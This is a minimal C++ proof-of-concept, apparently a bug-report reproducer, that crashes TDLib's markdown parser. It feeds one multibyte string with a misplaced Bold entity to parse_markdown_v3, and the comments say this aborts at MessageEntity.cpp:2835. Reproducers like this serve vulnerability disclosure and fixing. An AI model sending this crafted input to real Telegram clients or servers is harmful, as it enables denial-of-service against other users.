// Minimal end-to-end DoS reproducer (real TDLib ASAN build).
// One (text, entity) pair -> process abort at MessageEntity.cpp:2835.
#include <string>
#include <vector>
#include <cstdio>
#include "td/telegram/MessageEntity.h"

int main() {
  // The minimal trigger: markup + multibyte text, entity offset at markup tail.
  std::string text = "\xc3\xa9**x**";            // é**x**
  std::vector<td::MessageEntity> e;
  e.emplace_back(td::MessageEntity::Type::Bold, 5, 2);

  td::FormattedText ft{std::move(text), std::move(e)};
  auto md = td::parse_markdown_v3(std::move(ft));   // aborts at MessageEntity.cpp:2835
  (void)md;
  return 0;
}